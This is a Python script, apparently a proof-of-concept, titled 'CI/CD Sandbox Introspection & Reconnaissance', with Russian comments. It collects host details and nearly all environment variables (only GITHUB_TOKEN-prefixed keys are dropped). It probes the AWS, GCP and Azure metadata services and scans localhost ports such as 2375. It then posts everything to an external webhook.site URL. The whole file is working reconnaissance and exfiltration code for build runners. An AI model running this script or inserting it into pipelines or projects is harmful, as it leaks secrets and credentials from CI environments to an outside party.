import os
import sys
import platform
import socket
import json
import time
import requests

WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"

def gather_system_intel():
    """Глубокая разведка параметров хоста и окружения раннера"""
    intel = {
        "os_platform": platform.platform(),
        "architecture": platform.architecture(),
        "processor": platform.processor(),
        "python_version": sys.version,
        "hostname": socket.gethostname(),
        "local_ip": socket.gethostbyname(socket.gethostname()),
        "environment_variables": {k: v for k, v in os.environ.items() if not k.startswith("GITHUB_TOKEN")} # Скрываем секретные токены для безопасности
    }
    return intel

def check_cloud_metadata():
    """Инспекция локальных метаданных облачных провайдеров (AWS/GCP/Azure)"""
    metadata_endpoints = {
        "AWS": "http://169.254.169.254/latest/meta-data/",
        "GCP": "http://metadata.google.internal/computeMetadata/v1/",
        "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    }
    
    found_metadata = {}
    for cloud, url in metadata_endpoints.items():
        try:
            # Делаем быстрый запрос с жестким таймаутом, чтобы не вешать скрипт
            headers = {"Metadata-Flavor": "Google"} if cloud == "GCP" else {}
            res = requests.get(url, headers=headers, timeout=0.5)
            if res.status_code == 200:
                found_metadata[cloud] = "Accessible (Metadata Service Active)"
        except Exception:
            found_metadata[cloud] = "Closed / Unreachable"
            
    return found_metadata

def scan_local_ports():
    """Сканирование локалхоста на наличие открытых тестовых сервисов"""
    ports_to_check = [22, 80, 443, 3306, 5432, 6379, 8080, 2375]
    open_ports = []
    
    for port in ports_to_check:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        try:
            result = s.connect_ex(('127.0.0.1', port))
            if result == 0:
                open_ports.append(port)
        except:
            pass
        finally:
            s.close()
    return open_ports

if __name__ == "__main__":
    print("[*] Инициализация модуля CyberPoC v2.0 (Environment Introspection)...")
    start_time = time.time()
    
    report = {
        "poc_name": "CI/CD Sandbox Introspection & Reconnaissance",
        "timestamp": time.time(),
        "system_intel": gather_system_intel(),
        "cloud_metadata_status": check_cloud_metadata(),
        "open_local_ports": scan_local_ports(),
        "execution_time_seconds": round(time.time() - start_time, 4)
    }
    
    print("[+] Разведка успешно завершена. Сводка:")
    print(json.dumps(report, indent=2, ensure_ascii=False))
    
    # Экспорт данных на ваш Webhook
    try:
        response = requests.post(WEBHOOK_URL, json=report, timeout=10)
        print(f"[+] Телеметрия успешно доставлена на Webhook. Статус: {response.status_code}")
    except Exception as e:
        print(f"[-] Ошибка отправки: {e}")
